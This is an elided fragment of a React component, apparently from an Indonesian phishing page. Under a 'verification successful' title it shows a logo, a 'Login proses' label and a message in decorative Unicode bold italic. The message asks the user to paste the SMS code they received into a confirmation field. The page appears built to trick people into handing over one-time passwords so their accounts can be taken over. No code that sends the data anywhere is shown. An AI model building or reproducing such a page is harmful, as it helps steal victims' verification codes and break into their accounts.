...
function VerifikasiBerhasil() {
  return (
    <div className="container">
      ...
      <SiteImage logo={logo}/>   
          <p style={{wordWrap:'break-word', fontSize:'1rem'}}>𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑪𝒐𝒑𝒚/𝑺𝒂𝒍𝒊𝒏 𝑺𝑴𝑺 𝒀𝒂𝒏𝒈 𝑨𝒏𝒅𝒂 𝑻𝒆𝒓𝒊𝒎𝒂 𝑰𝒂𝒍𝒖 𝒅𝒊 𝑷𝒂𝒔𝒕𝒆/𝑻𝒆𝒎𝒑𝒆𝒍 𝒅𝒊 𝑲𝒐𝒍𝒐𝒎 𝑲𝒐𝒏𝒇𝒊𝒓𝒎𝒂𝒔𝒊 𝒀𝒂𝒏𝒈 𝒂𝒅𝒂 𝒅𝒊 𝑩𝒂𝒘𝒂𝒉 𝒊𝒏𝒊</p>
        </div>   
        <div style={{display:'flex', flexDirection:'column', justifyContent:'center'}}>  
          ...
          <p style={{marginTop:'-1.5em', fontSize:'1rem'}}>Login proses</p>
        </div> 
      </div>
    </div>
  )
